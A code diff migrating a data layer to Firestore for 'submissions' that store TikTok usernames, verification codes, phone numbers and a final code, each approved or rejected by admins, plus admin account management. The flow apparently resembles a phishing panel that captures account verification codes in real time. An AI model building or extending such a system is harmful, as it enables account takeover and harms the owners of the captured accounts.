@@ -1,46 +1,147 @@
 
+import { db } from './firebase';
 import type { Submission, AdminUser } from '@/lib/types';
-import { JsonStore } from './json-store';
-import { v4 as uuidv4 } from 'uuid';
+import bcrypt from 'bcryptjs';
 
-const submissionStore = new JsonStore<Submission[]>('src/data/submissions.json', []);
-const adminStore = new JsonStore<AdminUser[]>('src/data/admins.json', []);
+const submissionsCollection = db.collection('submissions');
+const adminsCollection = db.collection('admins');
+
+// Submissions
 
 export async function getSubmissions(): Promise<Submission[]> {
-  const submissions = await submissionStore.read();
-  return submissions.sort((a, b) => new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime());
+    const snapshot = await submissionsCollection.orderBy('createdAt', 'desc').get();
+    if (snapshot.empty) {
+        return [];
+    }
+    return snapshot.docs.map(doc => ({ ...doc.data() as Submission }));
 }
 
+export async function getSubmissionById(id: string): Promise<Submission | null> {
+    const doc = await submissionsCollection.doc(id).get();
+    if (!doc.exists) {
+        return null;
+    }
+    return doc.data() as Submission;
+}
+
+export async function createOrUpdateSubmission(id: string, data: Partial<Submission>): Promise<Submission> {
+    const submissionRef = submissionsCollection.doc(id);
+    const doc = await submissionRef.get();
+
+    let submissionData: Submission;
+
+    if (!doc.exists) {
+        submissionData = {
+            id,
+            tiktokUsername: id,
+            tiktokUsernameStatus: 'pending',
+            verificationCodeStatus: 'pending',
+            phoneNumberStatus: 'pending',
+            finalCodeStatus: 'pending',
+            isVerified: false,
+            createdAt: new Date().toISOString(),
+        };
+    } else {
+        submissionData = doc.data() as Submission;
+    }
+    
+    // Merge new data
+    Object.assign(submissionData, data);
+    
+    // Update statuses based on data presence
+    if (data.tiktokUsername) submissionData.tiktokUsernameStatus = 'approved';
+    if (data.verificationCode) submissionData.verificationCodeStatus = 'approved';
+    if (data.phoneNumber) submissionData.phoneNumberStatus = 'approved';
+    if (data.finalCode) {
+        submissionData.finalCodeStatus = 'approved';
+        submissionData.isVerified = true; // Auto-verify on final step
+    }
+
+    await submissionRef.set(submissionData, { merge: true });
+    return submissionData;
+}
+
+export async function updateSubmissionStepStatus(submissionId: string, step: string, status: 'approved' | 'rejected'): Promise<Submission> {
+    const submissionRef = submissionsCollection.doc(submissionId);
+    const doc = await submissionRef.get();
+
+    if (!doc.exists) {
+        throw new Error('Submission not found');
+    }
+
+    const submissionData = doc.data() as Submission;
+    const keyToUpdate = `${step}Status` as keyof Submission;
+
+    (submissionData as any)[keyToUpdate] = status;
+
+    if (status === 'rejected') {
+        submissionData.isVerified = false;
+    }
+    
+    if (step === 'finalCode' && status === 'approved') {
+        submissionData.isVerified = true;
+    }
+
+    await submissionRef.update(submissionData);
+    return submissionData;
+}
+
+export async function deleteSubmission(submissionId: string): Promise<void> {
+    await submissionsCollection.doc(submissionId).delete();
+}
+
+// Admins
+
 export async function getAdmins(): Promise<Omit<AdminUser, 'passwordHash'>[]> {
-    const admins = await adminStore.read();
-    return admins.map(({ passwordHash, ...rest }) => rest).sort((a, b) => new Date(a.createdAt).getTime() - new Date(b.createdAt).getTime());
+    const snapshot = await adminsCollection.orderBy('createdAt', 'asc').get();
+     if (snapshot.empty) {
+        return [];
+    }
+    return snapshot.docs.map(doc => {
+        const { passwordHash, ...adminData } = doc.data() as AdminUser;
+        return adminData;
+    });
 }
 
 export async function getAdminById(id: string): Promise<Omit<AdminUser, 'passwordHash'> | null> {
-    const admins = await adminStore.read();
-    const admin = admins.find(a => a.id === id);
-    if (!admin) return null;
-    const { passwordHash, ...rest } = admin;
-    return rest;
+    const doc = await adminsCollection.doc(id).get();
+    if (!doc.exists) {
+        return null;
+    }
+    const { passwordHash, ...adminData } = doc.data() as AdminUser;
+    return adminData;
 }
 
-
 export async function getAdminByEmail(email: string): Promise<AdminUser | null> {
-    const admins = await adminStore.read();
-    return admins.find(a => a.email === email) || null;
+    const snapshot = await adminsCollection.where('email', '==', email).limit(1).get();
+    if (snapshot.empty) {
+        return null;
+    }
+    return snapshot.docs[0].data() as AdminUser;
 }
 
 export async function addAdmin({ email, passwordHash, isMainAdmin }: { email: string; passwordHash: string; isMainAdmin: boolean }): Promise<AdminUser> {
-    const admins = await adminStore.read();
+    const newAdminRef = adminsCollection.doc();
     const newAdmin: AdminUser = {
-        id: uuidv4(),
+        id: newAdminRef.id,
         email,
         passwordHash,
         isMainAdmin,
         isVerified: isMainAdmin, // First admin is auto-verified
         createdAt: new Date().toISOString(),
     };
-    admins.push(newAdmin);
-    await adminStore.write(admins);
+    await newAdminRef.set(newAdmin);
     return newAdmin;
+}
+
+export async function updateAdminVerification(adminId: string, isVerified: boolean): Promise<Omit<AdminUser, 'passwordHash'>> {
+    const adminRef = adminsCollection.doc(adminId);
+    const doc = await adminRef.get();
+    if (!doc.exists) {
+        throw new Error("Admin not found");
+    }
+    await adminRef.update({ isVerified });
+    const updatedDoc = await adminRef.get();
+    const { passwordHash, ...adminData } = updatedDoc.data() as AdminUser;
+    return adminData;
 }
